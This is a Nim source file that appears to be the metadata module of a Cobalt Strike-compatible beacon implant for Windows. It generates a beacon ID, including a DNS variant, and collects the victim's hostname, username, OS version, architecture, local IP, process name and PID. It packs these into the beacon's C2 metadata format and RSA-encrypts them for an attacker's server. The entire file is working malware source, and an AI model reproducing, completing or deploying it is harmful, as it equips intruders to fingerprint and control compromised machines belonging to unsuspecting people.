import std/[random, os, math, strformat, strutils, net, endians, sequtils]
import ./[crypt, utils, config]
import winim
import winim/inc/windef

randomize()

var
    system_info*: SYSTEM_INFO
    meta_info_enc*: seq[byte]
    beacon_id*: int32
    magic_head: int32
    dns_base_domain*: string

    # host
    os_arch*: int # for proc use
    is_os_x64: bool
    os_version_major, os_version_minor, os_version_build: DWORD
    local_ip: int
    hostname, current_user: string
    locale_ansi, locale_oem: int32
    
    # process
    pid: int32
    process_name: string
    is_process_x64, is_high_priv: bool
    
    # link ssh - not implemented
    ssh_port = 0

    # smart inject - not implemented
    func_addr, func_gmh_addr, func_gpa_addr = 0.int32

GetNativeSystemInfo(&system_info)

proc gen_beacon_id(): int32 = 
    result = rand(0x10000000..0x7fffffff).int32
    when protocol == "dns://":
        result = result shr 1 shl 1 or 1202
        dns_base_domain = result.toHex(8) & server_base_domain
    else:
        result = result shr 1 shl 1

proc get_magic_head(): int32 = 0xbeef.int32

proc gen_metadata*(): seq[byte] = 
    if len(meta_info_enc) != 0: 
        dbg "[+] meta info already generated"
        return meta_info_enc
    
    beacon_id = gen_beacon_id()
    magic_head = get_magic_head()

    dbg "[+] beacon id: " & repr(beacon_id)

    # -- host
    var hostname_len: DWORD = 255
    hostname = newString(hostname_len)
    if GetComputerNameExA(computerNamePhysicalDnsHostname, &hostname, &hostname_len) == 0:
        dbg "[-] failed to get hostname"
        return
    hostname = hostname[0..hostname_len-1]
    dbg "[+] hostname: " & hostname
    
    var osinfo: OSVERSIONINFOA
    osinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA).int32
    if GetVersionExA(&osinfo) == 0:
        dbg "[-] failed to get os info"
        return
    os_version_major = osinfo.dwMajorVersion
    os_version_minor = osinfo.dwMinorVersion
    os_version_build = osinfo.dwBuildNumber
    dbg "[+] os version: " & $os_version_major & "." & $os_version_minor & "." & $os_version_build
    
    var sysinfo: SYSTEM_INFO
    GetNativeSystemInfo(&sysinfo)
    # 6 for ia64, 9 for amd64 and 12 for arm64
    os_arch = sysinfo.wProcessorArchitecture().int
    if os_arch in [6, 9, 12]: is_os_x64 = true
    else: is_os_x64 = false
    dbg "[+] os is x64: " & repr(is_os_x64) & " - " & $sysinfo.wProcessorArchitecture()

    var user_name_len = 128.int32
    current_user = newString(user_name_len)
    if GetUserNameExA(nameSamCompatible, &current_user, &user_name_len) == 0:
        dbg "[-] failed to get user name"
        return
    current_user = current_user[0..user_name_len-1]
    current_user = split(current_user, "\\")[^1]
    dbg "[+] username: " & current_user

    var local_addr = getPrimaryIPAddr()
    for i in 0..3: local_ip += local_addr.address_v4[i].int * (256 ^ i)
    dbg "[+] local ip: " & repr(local_ip) & " - " & repr(local_addr)

    locale_ansi = GetACP()
    codepage_ansi = locale_ansi
    locale_oem = GetOEMCP()
    # locale ansi and oem
    var locale = 65001'u16

    # -- process
    pid = getCurrentProcessId().int32
    dbg "[+] pid: " & $pid

    var is_wow64: BOOL
    if IsWow64Process(GetCurrentProcess(), &is_wow64) == 0:
        dbg "[-] failed to get wow64 info"
        return
    is_process_x64 = is_os_x64 and is_wow64 == 0

    var process_name_len = 255.DWORD
    process_name = newString(process_name_len)
    if GetModuleFileNameA(GetModuleHandleA(""), &process_name, process_name_len) == 0:
        dbg "[-] failed to get process name"
        return
    process_name = strip(split(process_name, "\\")[^1], chars= {'\0'})
    dbg "[+] process name: " & process_name

    # GetTokenInformation, TODO
    is_high_priv = true

    var metadata_flag = 0.byte
    if is_high_priv: metadata_flag += 8
    if is_os_x64: metadata_flag += 4
    if is_process_x64: metadata_flag += 2

    var temp4: array[0..3, byte]
    var temp2: array[0..1, byte]
    # meta info
    result.add(global_key)
    littleEndian16(&temp2, &locale)
    result.add(temp2)
    littleEndian16(&temp2, &locale)
    result.add(temp2)

    # online info
    bigEndian32(&temp4, &beacon_id)
    result.add(temp4)
    bigEndian32(&temp4, &pid)
    result.add(temp4)
    bigEndian16(&temp2, &ssh_port)
    result.add(temp2)
    result.add(metadata_flag)
    result.add(os_version_major.byte)
    result.add(os_version_minor.byte)
    bigEndian16(&temp2, &os_version_build)
    result.add(temp2)
    bigEndian32(&temp4, &func_addr)
    result.add(temp4)
    bigEndian32(&temp4, &func_gmh_addr)
    result.add(temp4)
    bigEndian32(&temp4, &func_gpa_addr)
    result.add(temp4)
    bigEndian32(&temp4, &local_ip)
    result.add(temp4)
    var os_info_str = hostname & "\t" & current_user & "\t" & process_name
    os_info_str = os_info_str[0..(hostname.len + current_user.len + process_name.len + 1)]
    if os_info_str.len > 58: os_info_str = os_info_str[0..57]
    dbg "[+] os info: " & os_info_str
    result.add(os_info_str.mapIt(it.ord.byte))

    var meta_len = result.len.int32
    dbg "[+] meta info len: " & $meta_len
    bigEndian32(&temp4, &meta_len)
    result.insert(temp4, 0)
    bigEndian32(&temp4, &magic_head)
    result.insert(temp4, 0)
    dbg "[+] meta info : " & repr(result)

    meta_info_enc = rsa_encrypt(result)
    # dbg "[+] rsa encrypted meta info: " & repr(meta_info_enc)

    return meta_info_enc

when isMainModule:
    dbg "[+] meta data bytes: "
    dbg repr(gen_metadata()) 
